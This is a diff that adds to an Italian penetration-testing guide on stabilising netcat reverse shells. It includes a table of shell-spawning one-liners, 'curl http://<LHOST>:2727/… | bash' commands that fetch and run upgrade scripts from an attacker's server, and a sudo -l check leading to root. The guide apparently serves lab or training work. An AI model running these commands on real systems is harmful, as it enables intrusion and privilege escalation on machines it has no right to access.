@@ -154,11 +154,15 @@ nc IP_VITTIMA 1234
 
 ### Migliorare la TTY (upgrade shell)
 
-Le shell ottenute con netcat sono "stupide" (niente frecce, niente tab, Ctrl+C chiude tutto). Ecco come migliorarle:
+Le shell ottenute con netcat sono "stupide" (niente frecce, niente tab, Ctrl+C chiude tutto).
+
+**Problema:** Senza un vero terminale TTY, non funzionano: frecce, Tab, Ctrl+C (uccide la connessione), `vim`, `nano`, `sudo`, `su`, `ssh` interattivo.
+
+#### Metodo classico (Python + stty)
 
 ```bash
 # 1. Spawna una bash vera con Python
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # 2. Premi Ctrl+Z (mette la shell in background)
 
@@ -172,6 +176,59 @@ stty rows 40 columns 120
 ```
 
 Per conoscere le dimensioni del tuo terminale: `echo $TERM` e `stty size`
+
+#### Tutti i metodi per spawnare una shell interattiva
+
+Se Python non è disponibile, esistono molte alternative:
+
+| Metodo | Comando |
+|--------|---------|
+| **Python3** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
+| **Python2** | `python -c 'import pty; pty.spawn("/bin/bash")'` |
+| **script** | `script -qc /bin/bash /dev/null` |
+| **Perl** | `perl -e 'exec "/bin/sh";'` |
+| **Ruby** | `ruby -e 'exec "/bin/sh"'` |
+| **Lua** | `lua -e 'os.execute("/bin/sh")'` |
+| **AWK** | `awk 'BEGIN {system("/bin/sh")}'` |
+| **Find** | `find . -exec /bin/sh \; -quit` |
+| **VIM** | `vim -c ':!/bin/sh'` |
+| **expect** | `expect -c 'spawn /bin/bash; interact'` |
+| **/bin/sh -i** | `/bin/sh -i` |
+
+> **Nota:** Questi metodi spawnano una shell ma non configurano il terminale. Dopo lo spawn, esegui comunque il passaggio Ctrl+Z + `stty raw -echo; fg` per avere frecce, Tab e history funzionanti.
+
+#### Upgrade automatico con SeaLion
+
+Se hai il server SeaLion attivo, puoi upgradare in un comando:
+
+```bash
+# Upgrade in-place (lavora sulla shell corrente, no nuove connessioni)
+curl http://<LHOST>:2727/upgrade2 | bash
+
+# Upgrade con nuova connessione socat (TTY piena)
+# Prerequisito: socat file:$(tty),raw,echo=0 tcp-listen:4444
+curl http://<LHOST>:2727/upgrade | bash
+```
+
+#### Verifica dei permessi dopo l'upgrade
+
+Una volta ottenuta una shell stabile, verificare subito il contesto di sicurezza:
+
+```bash
+# Cosa posso eseguire con sudo?
+sudo -l
+```
+
+Esempio di output favorevole:
+
+```
+User apache may run the following commands on ILF-WebSrv:
+    (ALL : ALL) NOPASSWD: ALL
+```
+
+Se l'utente ha `NOPASSWD: ALL`, si ha accesso root immediato con `sudo su -`.
+
+> **Nota:** `sudo -l` richiede un terminale TTY funzionante — ecco perché fare l'upgrade della shell è il primo passo dopo aver ottenuto accesso.
 
 ---
 
